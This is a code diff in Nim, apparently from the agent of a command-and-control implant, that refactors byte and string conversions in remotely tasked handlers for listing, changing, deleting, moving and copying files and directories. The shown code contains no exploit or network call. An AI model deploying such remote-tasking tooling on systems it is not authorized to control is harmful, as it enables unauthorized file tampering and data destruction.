@@ -113,17 +113,17 @@ when defined(agent):
                 raise newException(OSError, fmt"Failed to get working directory ({GetLastError()}).")
 
             let output = $buffer[0 ..< (int)length] & "\n"
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, output.toBytes())
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 
     # Change working directory
     proc executeCd(config: AgentConfig, task: Task): TaskResult = 
 
         # Parse arguments
-        let targetDirectory = task.args[0].data.toString()
+        let targetDirectory = Bytes.toString(task.args[0].data)
 
         echo fmt"   [>] Changing current working directory to {targetDirectory}."
 
@@ -135,7 +135,7 @@ when defined(agent):
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 
     # List files and directories at a specific or at the current path
@@ -158,7 +158,7 @@ when defined(agent):
                 targetDirectory = $cwdBuffer[0 ..< (int)cwdLength]
 
             of 1:  
-                targetDirectory = task.args[0].data.toString()
+                targetDirectory = Bytes.toString(task.args[0].data)
             else:
                 discard
 
@@ -282,17 +282,17 @@ when defined(agent):
                 output &= "\n" & fmt"{totalFiles} file(s)" & "\n"
                 output &= fmt"{totalDirs} dir(s)" & "\n"
 
-                return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, output.toBytes())
+                return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 
     # Remove file 
     proc executeRm(config: AgentConfig, task: Task): TaskResult = 
 
         # Parse arguments
-        let target = task.args[0].data.toString()
+        let target = Bytes.toString(task.args[0].data)
 
         echo fmt"   [>] Deleting file {target}."
 
@@ -303,14 +303,14 @@ when defined(agent):
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
             
 
     # Remove directory
     proc executeRmdir(config: AgentConfig, task: Task): TaskResult = 
 
         # Parse arguments
-        let target = task.args[0].data.toString()
+        let target = Bytes.toString(task.args[0].data)
 
         echo fmt"   [>] Deleting directory {target}."
 
@@ -321,15 +321,15 @@ when defined(agent):
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     # Move file or directory
     proc executeMove(config: AgentConfig, task: Task): TaskResult = 
 
         # Parse arguments
         let 
-            lpExistingFileName = task.args[0].data.toString()
-            lpNewFileName = task.args[1].data.toString()
+            lpExistingFileName = Bytes.toString(task.args[0].data)
+            lpNewFileName = Bytes.toString(task.args[1].data)
 
         echo fmt"   [>] Moving {lpExistingFileName} to {lpNewFileName}."
 
@@ -340,7 +340,7 @@ when defined(agent):
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 
     # Copy file or directory
@@ -348,8 +348,8 @@ when defined(agent):
 
         # Parse arguments
         let 
-            lpExistingFileName = task.args[0].data.toString()
-            lpNewFileName = task.args[1].data.toString()
+            lpExistingFileName = Bytes.toString(task.args[0].data)
+            lpNewFileName = Bytes.toString(task.args[1].data)
 
         echo fmt"   [>] Copying {lpExistingFileName} to {lpNewFileName}."
 
@@ -361,4 +361,4 @@ when defined(agent):
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
